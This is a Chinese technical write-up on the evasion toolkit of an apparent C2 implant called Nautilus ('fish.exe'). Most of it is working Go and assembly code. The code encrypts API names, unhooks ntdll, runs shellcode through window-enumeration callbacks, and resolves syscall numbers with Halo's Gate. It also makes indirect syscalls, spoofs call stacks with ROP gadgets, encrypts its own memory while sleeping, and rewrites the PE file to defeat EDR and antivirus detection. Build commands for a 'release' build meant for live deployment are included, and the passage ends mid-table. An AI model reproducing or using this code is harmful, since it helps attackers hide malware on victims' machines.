## 概述

免杀需要从**四个方向**构建完整的对抗栈：

1. **静态特征对抗** — 字符串加密、API名混淆、符号表清除，消除静态分析标记
2. **运行时行为对抗** — 直接/间接 syscall、调用栈欺骗、回调执行、反沙箱，绕过动态监控
3. **PE 标准化** — Section 名、熵值、导入表、Rich Header，使二进制看起来像正常程序
4. **网络伪装** — 通信路径伪装、请求头轮换、心跳抖动（详见通信协议篇）

本篇从基础到高级完整覆盖 Nautilus 的免杀技术栈，共 16 个技术模块。

## 一、多层字符串加密

静态分析的第一步是搜索可疑字符串（API名、C2地址、项目标识）。Nautilus 在源码层实现了两层加密，即使 Garble `-literals` 也无法覆盖这些字符串，因为它们在编译前就已经是密文。

### 1.1 动态密钥派生

每个字节的解密密钥不同，通过 `deriveKey` 偏移计算：

```go
func deriveKey(baseKey byte, offset int) byte {
    return (baseKey + byte(offset)*0x13) ^ 0x55
}
```

### 1.2 多层解密：轮询 XOR + 位旋转

```go
func multiDec(data []byte, baseKey byte) string {
    out := make([]byte, len(data))
    for i, b := range data {
        key := deriveKey(baseKey, i)
        out[i] = ((b ^ key) << 2) | ((b ^ key) >> 6)
    }
    return string(out)
}
```

解密过程：先用偏移密钥 XOR，再做 2-bit 左旋。每个字节独立密钥，无法用单密钥 XOR 批量还原。

### 1.3 加密数据示例

DLL 名和 API 名在源码中以加密字节切片存储：

```go
const xk byte = 0x7F

var (
    encNtDll  = []byte{0x11, 0x0B, 0x1B, 0x13, 0x13, 0x51, 0x1B, 0x13, 0x13}  // ntdll.dll
    encK32Dll = []byte{0x14, 0x1A, 0x0D, 0x11, 0x1A, 0x13, 0x4C, 0x4D, ...}    // kernel32.dll
    encU32Dll = []byte{0x0A, 0x0C, 0x1A, 0x0D, 0x4C, 0x4D, 0x51, 0x1B, ...}    // user32.dll
    encNAVM   = []byte{0x31, 0x0B, 0x3E, 0x13, 0x13, 0x10, 0x1C, ...}          // NtAllocateVirtualMemory
    encEW     = []byte{0x3A, 0x11, 0x0A, 0x12, 0x28, 0x16, 0x11, ...}          // EnumWindows
)
```

编译后的二进制中看不到任何 DLL/API 明文名。

### 1.4 加密库名混淆（crypto 库）

AES 加密模块自身的 import 路径也做了混淆：

```go
var (
    encAES  = []byte{0x2C, 0x17, 0x35, 0x3E, 0x2D, 0x40}             // crypto/aes
    encCiph = []byte{0x38, 0x28, 0x3A, 0x40, 0x2C, 0x35, 0x45}       // crypto/cipher
    encTLS  = []byte{0x38, 0x35, 0x38, 0x2E, 0x33, 0x44, 0x40}       // crypto/tls
)
const cryptoXk byte = 0x5A

func mlDec(data []byte, key byte) string {
    out := make([]byte, len(data))
    for i, b := range data {
        k := (key + byte(i)*0x11) ^ 0x3C
        out[i] = ((b ^ k) << 3) | ((b ^ k) >> 5)
    }
    return string(out)
}
```

crypto 库的 `mlDec` 与业务 API 的 `multiDec` 使用不同的旋转位数（3-bit vs 2-bit）和不同的密钥派生参数，防止跨域分析。

## 二、API 动态解析

所有 DLL 名和 API 名编译期加密，运行时通过 `syscall.NewLazyDLL` 动态解析：

```go
func xorDec(data []byte, key byte) string {
    out := make([]byte, len(data))
    for i, b := range data {
        out[i] = b ^ key
    }
    return string(out)
}

func ntProc(encName []byte) *syscall.LazyProc {
    return syscall.NewLazyDLL(xorDec(encNtDll, xk)).NewProc(xorDec(encName, xk))
}

func k32Proc(encName []byte) *syscall.LazyProc {
    return syscall.NewLazyDLL(xorDec(encK32Dll, xk)).NewProc(xorDec(encName, xk))
}

func u32Proc(encName []byte) *syscall.LazyProc {
    return syscall.NewLazyDLL(xorDec(encU32Dll, xk)).NewProc(xorDec(encName, xk))
}
```

每个 API 调用都通过加密字节切片存储，运行时 XOR 解密得到明文名再解析。关键 API 优先走直接 syscall 路径（SSN 解析失败时回退到 LazyDLL）：

```go
func CallNtAVM(hProcess uintptr, baseAddr *uintptr, regionSize *uintptr,
    allocType uintptr, protect uintptr) uintptr {
    if SSNMap != nil {
        return DirectNtAVM(hProcess, baseAddr, regionSize, allocType, protect)
    }
    // 回退: LazyDLL路径 (SSN解析失败时)
    ret, _, _ := ntProc(encNAVM).Call(hProcess, ...)
    return ret
}
```

## 三、Ntdll Unhooking

EDR 在 `ntdll.dll` 的 `.text` 段植入 inline hook（JMP 到 EDR 的监控函数）。Ntdll Unhooking 从磁盘读取干净的 ntdll，覆盖内存中被 hook 的代码：

```go
func NtdllUnhook() error {
    // 1. 获取内存中 ntdll 的 .text 段地址和大小
    hNtdll := syscall.NewLazyDLL(xorDec(encNtDll, xk)).Handle()
    loadedAddr, loadedSize := findTextInMemory(syscall.Handle(hNtdll))

    // 2. 从磁盘读取干净的 ntdll.dll
    cleanData, err := readFileRaw()

    // 3. 定位磁盘映像的 .text 段
    cleanAddr, cleanSize := findTextInBytes(cleanData)

    if loadedAddr == 0 || cleanAddr == nil || loadedSize != cleanSize {
        return nil
    }

    // 4. 修改内存保护为 RWX
    var old uint32
    regSz := uintptr(loadedSize)
    CallNtPVM(^uintptr(0), &loadedAddr, &regSz, 0x40, &old)

    // 5. 复制干净代码覆盖被 hook 的 .text
    CallRtlCopy(loadedAddr, *(*uintptr)(cleanAddr), uintptr(loadedSize))

    // 6. 恢复原始保护
    CallNtPVM(^uintptr(0), &loadedAddr, &regSz, uintptr(old), &old)

    return nil
}
```

文件路径也通过 XOR 加密存储：

```go
encPath := []byte{0x3C, 0x45, 0x23, ...}  // C:\Windows\System32\ntdll.dll
pathPtr, _ := syscall.UTF16PtrFromString(xorDec(encPath, xk))
```

## 四、回调执行（Callback Execution）

Shellcode 执行不直接调用 `CreateThread`，而是通过 `EnumWindows` / `EnumChildWindows` 的回调机制触发。每次执行随机选择其中一个，增加行为不可预测性：

```go
func CallEnumWindows(callback uintptr, lParam uintptr) uintptr {
    ret, _, _ := u32Proc(encEW).Call(callback, lParam)
    return ret
}

func CallEnumChildWindows(callback uintptr, lParam uintptr) uintptr {
    ret, _, _ := u32Proc(encECW).Call(callback, lParam)
    return ret
}
```

执行时随机开关：

```go
if rand.Intn(2) == 0 {
    CallEnumWindows(shellcodeCallback, 0)
} else {
    CallEnumChildWindows(shellcodeCallback, 0)
}
```

EDR 监控 `CreateThread` 和 `CreateRemoteThread` 的调用，但对窗口枚举回调不会标记为可疑——这是正常的 GUI 程序行为。

## 六、Halo's Gate + 直接 Syscall

### 6.1 问题：EDR 如何监控 API 调用

EDR（CrowdStrike、Defender、Elastic）通过 inline hook 拦截 `ntdll.dll` 中的函数：

```
正常 NtAllocateVirtualMemory:
  mov r10, rcx
  mov eax, 0x18       ← SSN (System Service Number)
  syscall
  ret

被 EDR hook 后:
  jmp EDR_NtAllocateVirtualMemory  ← 前 5 字节被替换为 JMP
  ...  (原始代码被覆盖)
```

EDR 的 hook 函数会检查调用参数，判断是否为恶意行为，然后决定放行或拦截。

### 6.2 Halo's Gate 原理

不调用被 hook 的 ntdll 函数，而是自己解析 SSN 并直接执行 SYSCALL 指令：

```
1. 通过 PEB 获取 ntdll.dll 基址（不使用 LoadLibrary/GetModuleHandle）
2. 解析 ntdll 导出表，按地址排序获取所有 Nt* 函数的 SSN
3. 检测 EDR hook：函数入口处为 E9(JMP) 或 FF25(JMP[mem]) 则被 hook
4. 从相邻未 hook 函数的 SSN 推断被 hook 函数的 SSN
5. Go 汇编 SYSCALL stub 直接入核
```

### 6.3 SSN 解析实现

```go
func parseNtExports(base uintptr) []ntFuncInfo {
    // 1. 验证 MZ 签名
    if *(*uint16)(unsafe.Pointer(base)) != 0x5A4D { return nil }

    // 2. 定位 PE 头 → 导出目录
    eLfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
    exportDirRVA := *(*uint32)(unsafe.Pointer(base + uintptr(eLfanew) + 0x88))

    // 3. 遍历导出函数的名称表
    numNames := *(*uint32)(unsafe.Pointer(exportDir + 0x18))
    addrOfNames := *(*uint32)(unsafe.Pointer(exportDir + 0x20))
    addrOfOrdinals := *(*uint32)(unsafe.Pointer(exportDir + 0x24))

    for i := uint32(0); i < numNames; i++ {
        nameRVA := *(*uint32)(unsafe.Pointer(funcNamesBase + uintptr(i*4)))
        name := cStringToGo(base + uintptr(nameRVA))

        // 只收集 Nt/Zw 前缀函数
        if !strings.HasPrefix(name, "Nt") && !strings.HasPrefix(name, "Zw") {
            continue
        }

        ordinal := *(*uint16)(unsafe.Pointer(ordinalsBase + uintptr(i*2)))
        funcRVA := *(*uint32)(unsafe.Pointer(funcAddrsBase + uintptr(ordinal*4)))
        funcAddr := base + uintptr(funcRVA)
        funcs = append(funcs, ntFuncInfo{name, funcAddr, 0})
    }

    // 4. 按函数地址排序（SSN 与地址排序一致）
    sort.Slice(funcs, func(i, j int) bool {
        return funcs[i].addr < funcs[j].addr
    })

    // 5. 分配 SSN
    for i := range funcs {
        funcs[i].ssn = uint32(i)
    }
}
```

### 6.4 Hook 检测与 SSN 修正

```go
func resolveSSN(name string) uint32 {
    info, ok := ntFuncs[name]
    if !ok { return 0 }

    // 检查函数入口是否被 hook
    // E9 = JMP rel32, 0xFF 0x25 = JMP [mem]
    if *(*byte)(unsafe.Pointer(info.addr)) == 0xE9 ||
       *(*uint16)(unsafe.Pointer(info.addr)) == 0x25FF {
        // 从相邻函数推断 SSN
        for i := range ntFuncs {
            if i+1 < len(ntFuncs) && ntFuncs[i].name == name {
                for j := i + 1; j < len(ntFuncs); j++ {
                    b := *(*byte)(unsafe.Pointer(ntFuncs[j].addr))
                    if b != 0xE9 {
                        return ntFuncs[j].ssn - uint32(j-i)
                    }
                }
            }
        }
    }
    return info.ssn
}
```

### 6.5 Go 汇编 SYSCALL Stub（直接版本）

Go 编译器不允许内联汇编，必须单独编写 `.s` 文件。以下是**直接 syscall** 版本（后续升级为间接）：

```asm
//go:build windows

TEXT ·rawSyscall6(SB),0,$0-64
    MOVL ssn+0(FP), AX         // SSN → EAX
    MOVQ a1+8(FP), CX
    MOVQ CX, R10               // arg1 → R10（x64 syscall 约定）
    MOVQ a2+16(FP), DX         // arg2 → RDX
    MOVQ a3+24(FP), R8         // arg3 → R8
    MOVQ a4+32(FP), R9         // arg4 → R9
    MOVQ a5+40(FP), R11
    MOVQ R11, a4+32(FP)        // arg5 → [RSP+0x28]
    MOVQ a6+48(FP), R11
    MOVQ R11, a5+40(FP)        // arg6 → [RSP+0x30]
    SYSCALL                    // 直接入内核
    MOVQ AX, ret+56(FP)        // NTSTATUS → 返回值
    RET
```

**x64 Windows SYSCALL 调用约定**：
- 参数 1~4：R10、RDX、R8、R9（不是 RCX，SYSCALL 指令会破坏 RCX）
- 参数 5~N：`[RSP+0x28]` 开始逐个入栈
- 返回值：RAX（NTSTATUS）

### 6.6 Go 包装器

```go
func rawSyscall6(ssn uint32, a1, a2, a3, a4, a5, a6 uintptr) uintptr

func DirectNtAVM(hProcess uintptr, baseAddr *uintptr, zeroBits uintptr,

    return rawSyscall6(ssn,
        uintptr(hProcess),
        uintptr(unsafe.Pointer(baseAddr)),
        zeroBits,
        uintptr(unsafe.Pointer(regionSize)),
        uintptr(allocType),
        uintptr(protect))

```

## 七、间接 Syscall（Indirect Syscall）

### 7.1 问题：直接 SYSCALL 的缺陷

6.5 节的汇编 stub 直接在代码中执行 `SYSCALL` 指令。虽然 EDR 无法 hook 这个 `SYSCALL`（它不在 ntdll 中），但现代 EDR（如 Elastic、CrowdStrike）会进行栈回溯：

```
内核 syscall 处理 → 检查调用栈
  RIP at SYSCALL:  0x7FFA1234ABCD  ← 不在 ntdll.dll 范围内
  调用者:          fish_agent!rawSyscall6+0x3F
  → 判定为直接 syscall，告警
```

EDR 知道 ntdll.dll 的地址范围。如果 `SYSCALL` 指令的地址不在这个范围内，就是可疑的直接 syscall。

### 7.2 原理：CALL 到 ntdll 的 syscall gadget

不自己执行 `SYSCALL`，而是 `CALL` 到 ntdll 中已有的 `syscall; ret` 指令对：

```
之前（直接）:
  fish_agent!rawSyscall6:
    MOV R10, RCX
    MOV EAX, SSN
    SYSCALL        ← RIP 指向 fish_agent，EDR 告警
    RET

现在（间接）:
  fish_agent!rawSyscall6:
    MOV R10, RCX
    MOV EAX, SSN
    CALL [ntdllGadget]   ← CALL 到 ntdll 内部

  ntdll!NtXXX+0x12:
    SYSCALL              ← RIP 指向 ntdll.dll，EDR 放行
    RET                  ← 返回到 fish_agent 的 CALL 之后
```

`CALL` 会把返回地址压栈，所以 ntdll 的 `RET` 会回到 `fish_agent` 的代码继续执行。但 EDR 栈回溯时，`SYSCALL` 指令的地址在 ntdll 范围内，不会被标记为可疑。

### 7.3 寻找 Gadget

在 ntdll 的 `.text` 段中搜索 `syscall; ret`（`0x0F 0x05 0xC3`）字节序列。每个 Nt* 函数都以这个序列结尾，`.text` 段中有数百个可用 gadget：

```go
func findSyscallRetGadget(base uintptr) uintptr {
    // 1. 解析 PE 头 → 定位 .text 段
    numSections := *(*uint16)(unsafe.Pointer(ntHeader + 4 + 2))
    sizeOfOpt := *(*uint16)(unsafe.Pointer(ntHeader + 4 + 16))
    sectionBase := ntHeader + 4 + 20 + uintptr(sizeOfOpt)

    for i := uint16(0); i < numSections; i++ {
        sec := sectionBase + uintptr(i)*40 // IMAGE_SECTION_HEADER = 40 bytes

        // 检查段名是否为 ".text"
        namePtr := (*[8]byte)(unsafe.Pointer(sec))
        if namePtr[0] == '.' && namePtr[1] == 't' && namePtr[2] == 'e' &&
           namePtr[3] == 'x' && namePtr[4] == 't' {
            start := base + uintptr(sec.VirtualAddress)
            end := start + uintptr(sec.VirtualSize)

            // 扫描 0x0F 0x05 0xC3
            for addr := start; addr < end-2; addr++ {
                b := (*[3]byte)(unsafe.Pointer(addr))
                if b[0] == 0x0F && b[1] == 0x05 && b[2] == 0xC3 {
                    return addr
                }
            }
        }
    }
    return 0
}
```

### 7.4 汇编 Stub 修改

三个 syscall stub（rawSyscall4/6/12）全部改为条件分支：有 gadget 时走间接路径，没有时回退到直接 SYSCALL：

```asm
TEXT ·rawSyscall6(SB),0,$0-64
    MOVQ ·ntdllGadget(SB), R11    // 加载 gadget 地址
    CMPQ R11, $0
    JE   direct6                   // gadget=0 → 回退直接路径

    // 间接路径: CALL ntdll gadget (syscall;ret)
    MOVL ssn+0(FP), AX
    MOVQ a1+8(FP), CX
    MOVQ CX, R10
    MOVQ a2+16(FP), DX
    MOVQ a3+24(FP), R8
    MOVQ a4+32(FP), R9
    MOVQ a5+40(FP), R11
    MOVQ a6+48(FP), R12
    MOVQ R11, a4+32(FP)
    MOVQ R12, a5+40(FP)
    MOVQ ·ntdllGadget(SB), R11
    CALL R11                       // CALL ntdll!syscall;ret
    MOVQ AX, ret+56(FP)            // 存储 NTSTATUS
    RET

direct6:
    // 回退：直接 SYSCALL
    MOVL ssn+0(FP), AX
    MOVQ a1+8(FP), CX
    MOVQ CX, R10
    // ... 相同参数设置 ...
    SYSCALL
    MOVQ AX, ret+56(FP)
    RET
```

在 `InitSSNMap()` 之后调用，所有 syscall 包装器无需修改：

## 八、调用栈欺骗（Call Stack Spoofing）

### 8.1 问题：间接 syscall 的剩余风险

第七节的间接 syscall 让 EDR 的栈回溯看到 `SYSCALL` 指令在 ntdll 内执行，但继续回溯会看到调用者：

```
ntdll!syscall;ret        ← SYSCALL 位置在 ntdll（通过 CALL 跳入）
ntdll!ret                 ← 返回地址
fish_agent!rawSyscall6   ← 调用者暴露了
```

EDR 看到调用链中有非受信模块直接调用 ntdll 的 syscall gadget，仍然可疑。正常的 API 调用链是：

```
ntdll!NtXXX → kernel32!SomeFunc → user32!OtherFunc → app!main
```

### 8.2 原理：伪造调用链

通过 ROP（Return-Oriented Programming）技巧，在栈上构造假的返回地址链。执行 `JMP`（而非 `CALL`）跳到 ntdll 的 syscall gadget，让 `ret` 指令沿着伪造的链展开：

```
真实栈布局（SP 向下增长）:

 [RSP+0x38]  real_return  ──→ ·spoofed4Ret (写入结果后 RET)
 [RSP+0x30]  $0 (padding)
 [RSP+0x28]  $0 (padding)
 [RSP+0x20]  $0 (padding)
 [RSP+0x18]  $0 (padding)
 [RSP+0x10]  $0 (padding)
 [RSP+0x08]  cleanup4 ──→ kernel32!add_rsp_0x28_ret
 [RSP+0x00]  ret_gadget ──→ ntdll!ret

执行流程:
  1. JMP ntdllGadget(syscall;ret)
  2. ret 弹出 ret_gadget → 跳到 ntdll!ret
  3. ret 弹出 cleanup4  → 跳到 kernel32!add rsp,0x28;ret
  4. add rsp,0x28 跳过 5 个 padding qword
  5. ret 弹出 real_return → 跳到 spoofed4Ret

EDR 栈回溯看到的调用链:
  ntdll!syscall ← ntdll!ret ← kernel32!add_rsp_0x28_ret ← fish_agent
```

EDR 看到的调用链经过 ntdll 和 kernel32，与正常 API 调用模式一致。

### 8.3 寻找 Gadget

需要两类 gadget：

| Gadget | 来源 | 字节序列 | 作用 |
|--------|------|----------|------|
| `ret` | ntdll .text | `C3` | 弹出并跳转到 cleanup |
| `add rsp,N; ret` | kernel32 .text | `48 83 C4 NN C3` | 跳过 padding，弹出 real_return |

```go
// findRetGadget 在 .text 段搜索 ret (0xC3)
func findRetGadget(base uintptr) uintptr {
    start, end := getSectionRange(base)
    for addr := start; addr < end; addr++ {
        if *(*byte)(unsafe.Pointer(addr)) == 0xC3 {
            return addr
        }
    }
    return 0
}

// findAddRspRet 搜索 add rsp, N; ret (48 83 C4 NN C3)
func findAddRspRet(base uintptr, n byte) uintptr {
    start, end := getSectionRange(base)
    pattern := [5]byte{0x48, 0x83, 0xC4, n, 0xC3}
    for addr := start; addr < end-4; addr++ {
        if *(*[5]byte)(unsafe.Pointer(addr)) == pattern {
            return addr
        }
    }
    return 0
}
```

ntdll 的 `.text` 段有数百个 `ret` 指令，kernel32 也包含大量 `add rsp, N; ret` 序列。搜索第一个匹配项即可。

### 8.4 栈帧大小计算

cleanup gadget 的 `add rsp, N` 决定了需要多少 padding，不同参数数量的 syscall 需要不同尺寸的栈帧：

| Syscall | fake frame | cleanup | cleanup skip | 布局要点 |
|---------|-----------|---------|-------------|---------|
| rawSyscall4 | 0x40 (8 qwords) | add rsp, 0x28 | 5 qwords padding | 4 参数全走寄存器 |
| rawSyscall6 | 0x48 (9 qwords) | add rsp, 0x30 | 3 padding + arg5 + arg6 + 1 padding | arg5/arg6 在 [RSP+0x28]/[RSP+0x30] |
| rawSyscall12 | 0x78 (15 qwords) | add rsp, 0x60 | 3 padding + arg5~12 + 1 padding | arg5~12 在 [RSP+0x28]~[RSP+0x60] |

关键约束：cleanup gadget 的 `add rsp, N` 跳过所有中间数据后，`ret` 恰好弹出 real_return。同时 total frame = 2（前两个 gadget）+ cleanup_skip_qwords + 1（real_return），最终 RSP 恰好回到调用者的栈帧。

### 8.5 Go 汇编实现

```asm
// 栈欺骗返回桩 — 独立 TEXT 函数
// 进入时 RSP 已由 gadget 链恢复至调用者栈帧
TEXT ·spoofed4Ret(SB),0,$0-0
    MOVQ AX, 48(SP)    // 写入 rawSyscall4 的 ret+40(FP) = RSP+48
    RET

TEXT ·rawSyscall4(SB),0,$0-48
    MOVL ·spoofEnabled(SB), R15
    CMPL R15, $0
    JE   indirect4

    // 栈欺骗路径
    MOVQ $·spoofed4Ret(SB), R15    // real_return 地址
    MOVQ ·spoofRetGadget(SB), R12  // ntdll!ret
    MOVQ ·spoofCleanup4(SB), R13   // kernel32!add rsp,0x28;ret
    MOVQ ·ntdllGadget(SB), R14     // ntdll!syscall;ret
    SUBQ $0x40, SP                 // 分配假栈帧
    MOVQ R12, 0x00(SP)             // [RSP+0x00] = ret_gadget
    MOVQ R13, 0x08(SP)             // [RSP+0x08] = cleanup
    MOVQ $0, 0x10(SP)              // padding × 5
    MOVQ $0, 0x18(SP)
    MOVQ $0, 0x20(SP)
    MOVQ $0, 0x28(SP)
    MOVQ $0, 0x30(SP)
    MOVQ R15, 0x38(SP)             // [RSP+0x38] = real_return
    // 设置 syscall 参数
    MOVL ssn+0(FP), AX
    MOVQ a1+8(FP), CX
    MOVQ CX, R10
    MOVQ a2+16(FP), DX
    MOVQ a3+24(FP), R8
    MOVQ a4+32(FP), R9
    JMP R14                        // JMP（非 CALL）到 syscall;ret
```

与间接 syscall 使用 `CALL` 不同，栈欺骗路径使用 `JMP`。因为伪造的栈帧上已经有返回地址链，不需要 `CALL` 额外压入返回地址。

### 8.6 Go 汇编的特殊挑战

实现过程中一个关键踩坑：**Go Plan 9 汇编器不支持引用同一 TEXT 块内的局部标签作为地址值**。

尝试过的方案：
- `LEAQ spoofed4Done<>(SB), R15` → "relocation target not defined"
- `LEAQ spoofed4Done, R15` → "illegal addressing mode"
- `MOVQ $spoofed4Done, R15` → "illegal addressing mode"
- `CALL/POP/ADDQ$(label1-label2)` → 标签算术不支持

最终方案：将返回桩提取为独立的包级 `TEXT` 函数（`·spoofed4Ret`、`·spoofed6Ret`、`·spoofed12Ret`），通过 `$·funcName(SB)` 加载地址。这些函数进入时 RSP 已由 gadget 链恢复，直接用 `N(SP)` 偏移写入调用者的返回值槽位。

### 8.7 三级回退策略

每个 syscall stub 实现三级路径，按优先级自动选择：

```
spoofEnabled == 1  →  栈欺骗路径 (JMP + fake frame)
        ↓
ntdllGadget != 0   →  间接 syscall (CALL ntdll gadget)
        ↓
      否则          →  直接 SYSCALL (回退)
```

gadget 未找到时 `spoofEnabled` 保持 0，自动降级到间接 syscall。间接 gadget 也未找到时，降级到直接 SYSCALL。确保在任何环境下都能正常工作。

## 十、Ekko Sleep 加密

### 10.1 问题：内存扫描器

EDR 和沙箱会定期扫描进程内存，检查是否存在可疑代码特征。植入体在内存中长时间驻留，就可能被扫描发现。

### 10.2 原理

在休眠期加密植入体模块的数据页，EDR 内存扫描器只能看到加密数据：

```
唤醒 → 解密数据页 → 执行任务 → 加密数据页 → 休眠
  ↑                                             ↓
  └──────────────── 循环 ────────────────────────┘
```

### 10.3 只加密数据页，不加密代码页

初版 EkkoSleep 加密了所有内存页（包括 `.text`），导致 Go 的 Timer Queue 回调执行加密代码后崩溃。修复方案：跳过所有 `PAGE_EXECUTE*` 保护的内存页：

```go
func encryptModulePages(ctx *ekkoCtx, modBase, modSize uintptr) {
    addr := modBase
    for addr < modBase+modSize {
        VirtualQuery(addr, &mbi, sizeof(mbi))
        // 跳过可执行页（.text 段）
        if mbi.Protect&0xF0 != 0 {  // PAGE_EXECUTE* 标志位
            addr += mbi.RegionSize
            continue
        }
        if mbi.State == MEM_COMMIT &&
            (mbi.Protect&PAGE_READWRITE != 0 || mbi.Protect&PAGE_READONLY != 0) {
            xorEncryptRange(addr, mbi.RegionSize, ctx.encKey)
        }
        addr += mbi.RegionSize
    }
}
```

### 10.4 堆分配上下文（关键修复）

Go 运行时将全局变量存储在 `.data` 段，加密全局变量会导致 Timer Queue 回调读取到错误数据。修复方案：所有上下文数据（密钥、页面列表）通过堆分配，回调参数传递指针：

```go
type ekkoCtx struct {
    encKey byte
    pages  []ekkoPageInfo
    woken  uint32
    event  windows.Handle
}

func EkkoSleep(d time.Duration) {
    ctx := &ekkoCtx{              // 堆分配，不在 .data 段
        encKey: byte(time.Now().UnixNano() & 0xFF),
        pages:  make([]ekkoPageInfo, 0, 64),
    }
    encryptModulePages(ctx, modBase, modSize)

    // Timer Queue 回调通过 lpParameter 接收 ctx 指针
    createTimerQueueTimer.Call(..., uintptr(unsafe.Pointer(ctx)), ...)
    waitForSingleObject.Call(uintptr(ctx.event), 0xFFFFFFFF)
}
```

### 10.5 定时唤醒机制

使用 `CreateTimerQueueTimer` + `WaitForSingleObject` 实现可定时唤醒的休眠：

```go
func ekkoTimerCallback(param uintptr, timerOrWaitFired byte) uintptr {
    ctx := (*ekkoCtx)(unsafe.Pointer(param))
    decryptModulePages(ctx)
    windows.SetEvent(ctx.event)
    ctx.woken = 1
    return 0
}
```

## 十一、PE 后处理

编译完成后，对 PE 文件执行 7 个后处理步骤，消除编译器指纹和可疑特征。

### 11.1 字符串清零（安全级 — 50+ 模式）

扫描二进制中的敏感字符串并用 0x00 覆盖：

```go
patterns := []string{
    "Go build ID: ", "Go buildinf", "go.buildid",
    "runtime.main", "runtime.goexit", "main.main",
    "runtime.init", "runtime.gc", "runtime.morestack",
    "shellcode", "VirtualAlloc", "VirtualProtect",
    "NtAllocateVirtualMemory", "NtProtectVirtualMemory",
    "AmsiScanBuffer", "EtwEventWrite",
    "CreateRemoteThread", "WriteProcessMemory",
    "ntdll", "kernel32", "EnumWindows",
    "nautilus", "fish", "C2", "implant", "stager",
    "crypto/aes", "crypto/rand", "net/http",
    ...  // 50+ 模式
}

for _, pattern := range patterns {
    // 扫描所有出现位置 → 用 0x00 覆盖
    for i := 0; i <= len(data)-len(patternBytes); i++ {
        if match(data[i:], patternBytes) {
            for j := 0; j < len(patternBytes); j++ {
                data[i+j] = 0x00
            }
        }
    }
}
```

安全级不影响调试能力，开发/测试环境使用。

### 11.2 Rich Header 清除

Go 编译器在 PE 中留下 Rich Header（`DanS` → `Rich`），暴露编译器版本信息。清零整段：

```go
// 搜索 "Rich" 签名 → 回溯到 "DanS" → 整段清零
richSig := []byte("Rich")
for i := 0; i < len(data) && i < 4096; i++ {
    if data[i:i+4] == richSig {
        richStart := findDanS(i)  // 回溯找 DanS
        for k := richStart; k < richEnd; k++ {
            data[k] = 0x00
        }
        break
    }
}
```

### 11.3 PE Section 名标准化

Go 二进制的 Section 名（`.go.buildinfo`、`.gopclntab`、`.noptrdata` 等）是明显的 Go 指纹。重命名为 MSVC 标准名：

```go
sectionRenameMap := map[string]string{
    ".go.buildinfo": ".rdata",
    ".gopclntab":    ".data",
    ".noptrdata":    ".rdata",
    ".ptrdata":      ".data",

    ".itablink":     ".rdata",

    ".typelink":     ".rdata",
}
```

重命名后，PE Section 结构看起来像 MSVC 编译的正常程序。

### 11.4 .text 熵值降低

Shannon 熵值 > 6.0 的 `.text` 段会被启发式检测标记为加密/压缩代码。注入低熵 padding（`0xCC/0x90` 交替）降低熵值：

```go
func reduceTextEntropy(data []byte) {
    currentEntropy := shannonEntropy(textData)
    targetEntropy := 6.0
    if currentEntropy > targetEntropy {
        paddingSize := int(float64(len(textData)) * (currentEntropy - targetEntropy) / (8.0 - targetEntropy))
        paddingSize = (paddingSize + 4095) & ^4095  // 对齐到 4KB

        padding := make([]byte, paddingSize)
        for j := 0; j < paddingSize; j += 8 {
            copy(padding[j:j+8], []byte{0xCC, 0xCC, 0xCC, 0xCC, 0x90, 0x90, 0x90, 0x90})
        }
    }
}
```

`0xCC`（INT3）和 `0x90`（NOP）是调试器常用的合法指令，不会触发异常行为检测。

### 11.5 导入表稀释

Go 二进制默认只导入少数 API（`LoadLibrary`、`GetProcAddress` 等），这是 Go 程序的典型指纹。引入 31 个合法 API（来自 8 个系统 DLL），使 IAT 看似正常 GUI 应用：

```go
// 8 个 DLL: gdi32, shell32, ole32, advapi32, user32, kernel32, version + ntdll
// 31 个 API: CreateSolidBrush, DeleteObject, DrawTextW, GetDC,
//   SHGetFolderPath, CoInitialize, RegOpenKeyExW,
//   GetDesktopWindow, ShowWindow, GetModuleHandleW, ...
func InitLegitimateAPIs() {
    defer func() { recover() }()
    procCreateSolidBrush.Call(uintptr(0x00FFFFFF))
    procDeleteObject.Call(uintptr(0))
    procDrawText.Call(0, 0, 0, 0, 0, 0)
    procGetDC.Call(uintptr(0))
    procCoInitialize.Call(uintptr(0))
    procCoUninitialize.Call()
    ...
}
```

每个调用都通过 XOR 加密 DLL/API 名（与第二节统一密钥 `xk=0x7F`），初始化时实际调用一次以确保 IAT 中有真实导入记录。

### 11.6 Authenticode 签名

### 11.7 Overlay + 合法字符串注入

二进制末尾附加 32KB 随机数据（带 `PK\x03\x04` ZIP 文件头签名），模拟正常软件的 overlay 资源：

## 十二、深度清零（发布版）

### 12.1 为什么需要深度清零

第一级字符串清零（`-EnableStringZero`）覆盖了 C2 业务字符串和敏感 API 名，但 **Go runtime 内部字符串** 仍在：

```
fish.exe 中残留的可疑字符串:
  CreateThread     ← Windows API，进程创建类操作标志性函数
  inject           ← runtime.injectglist，Go 调度器内部
  callback         ← runtime.winCallback/cgocallback，Go CGO 内部
  register         ← runtime.dstRegister/RegisterProtocol
  fish             ← 项目名，Go 模块路径残留
```

这些字符串不是 Sliver C2 的特征码，但 ML 模型（CrowdStrike、Elastic）可能将它们作为 **Go binary + inject + CreateThread + 无符号** 的组合特征判定为可疑。

### 12.2 两级清零策略

| 级别 | 标志 | 覆盖范围 | 适用场景 | 对调试的影响 |
|------|------|---------|---------|-------------|
| 安全级 | `-EnableStringZero` | C2 字符串 + 敏感 API（50+ 模式） | 开发/测试 | 无影响 |
| 发布级 | `-DeepStringZero` | **额外** Go runtime 内部字符串（30+ 模式） | 实战部署 | panic 时无法输出错误信息 |

发布级额外清零的模式：

```
Windows API:  CreateThread, CreateProcess, CreateRemoteThread,
              VirtualAllocEx, OpenProcess, TerminateProcess,
              SetThreadContext, ResumeThread, SuspendThread

Go Runtime:   injectglist, winCallback, cgocallback,
              callbackUpdate, callbackWrap, callbackasm,
              RegisterProtocol, dstRegister, compileCallback,
              debugCallCheck, debugCallWrap, dwStackSize

项目名:       fish

检测规避:     SYSCALL, syscall;ret, 0x0F05C3
```

### 12.3 构建命令

```powershell
# 开发版（安全清零 + garble）
.\build.ps1 -Garble -ControlFlow -EnableStringZero -SkipSandbox
# 输出: fish.exe

# 发布版（深度清零 + garble）
.\build.ps1 -Garble -ControlFlow -EnableStringZero -DeepStringZero -SkipSandbox
# 输出: fish.exe + fish_release.exe
```

发布版自动生成 `fish_release.exe`，与开发版区分命名。

## 十三、Authenticode 签名：为什么不做

### 13.1 签名克隆实验

我们测试了 Authenticode 签名克隆（从 svchost.exe 提取 Microsoft 签名移植到 fish.exe）：

| 版本 | 检出 | 说明 |
|------|------|------|
| fish.exe（无签名） | **5/70** | 基准 |
